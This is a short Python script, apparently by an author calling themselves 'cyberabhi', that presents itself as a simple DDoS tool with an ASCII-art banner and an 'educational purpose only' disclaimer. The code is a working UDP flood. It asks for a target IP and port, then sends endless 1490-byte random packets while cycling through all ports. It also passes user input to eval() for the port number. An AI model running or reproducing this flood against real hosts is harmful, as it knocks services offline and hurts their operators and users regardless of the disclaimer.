import os
import time
import socket
import scapy.all as scapy
import random

# DDOS-Attack [ASCII Art]


def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)



display_banner()

# Terminal header settings and information

print( " referenced by  H.O.D of MCA Dep.- Mr.Mayank Shukla ,MPGI",) 

print("Developor     :   cyberabhi")
print('Project       :   DDOS-Attack')
print('Purpose       :   A simple DDOS-Attack tool to test your network security')
print('Caution!!!!   :   This tool is only for educational purpose. Do not use this for illegal purposes, IF YOU USE THIS TOOL FOR ANY ILLEGAL ACTIVITY THEN ONLY YOU ARE RESPONSIBLE FOR IT!!!!!!!!!!!')

print('THANKYOU')

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes for our attack
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Type your ip and port number (find IP address using nslookup or any online website)
ip = input("IP Target : ")
port = eval(input("Port       : "))

# Lets start the attack
print("Thank you for using the cyberabhi Software (DDOS-ATTACK-TOOL).")
print("Starting the attack on ", ip, " at port ", port, "...")

time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1

# End of the script
os.system("cls")
input("Press Enter to exit...")
